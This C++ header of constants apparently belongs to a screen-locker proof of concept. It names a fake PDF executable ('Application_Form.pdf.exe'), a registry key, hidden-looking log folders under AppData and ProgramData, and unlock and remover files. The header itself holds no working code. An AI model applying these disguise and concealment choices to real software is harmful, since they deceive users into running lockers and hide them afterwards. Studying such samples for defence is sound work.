#pragma once

#include <windows.h> // For wchar_t

namespace Constants {
    // --- Registry ---
    constexpr wchar_t RegistryKeyName[] = L"WCC_DocumentViewer";

    // --- File & Folder Names ---
    constexpr char UnlockHtmlFile[] = "unlock.html";
    constexpr char MainLogFile[] = "system_log.txt";
    constexpr char RemoverLogFile[] = "remover_log.txt";
    constexpr char RemoverExeName[] = "remover.exe";
    constexpr char AppDataLogDir[] = "\\Windows";
    constexpr char ProgramDataDir[] = "\\ipTime";

    // --- Known Executable Names for Remover ---
    constexpr char ExeName1[] = "Form_DocumentViewer.exe";
    constexpr char ExeName2[] = "Application_Form.pdf.exe";
    constexpr char ExeName3[] = "ScreenLockerPoC.exe";

    // --- Identifiers ---
    constexpr int RemoverResourceID = 101;
    constexpr UINT_PTR SecurityTimerID = 1001;

    // --- Communication ---
    constexpr wchar_t UnlockSignal[] = L"UNLOCK_REQUEST_SENT";

    // --- USB Emergency Remover ---
    constexpr char UsbRemoverExeName[] = "usb_remover.exe";
    constexpr char UsbUnlockKeyFile[] = "_unlock.key";
}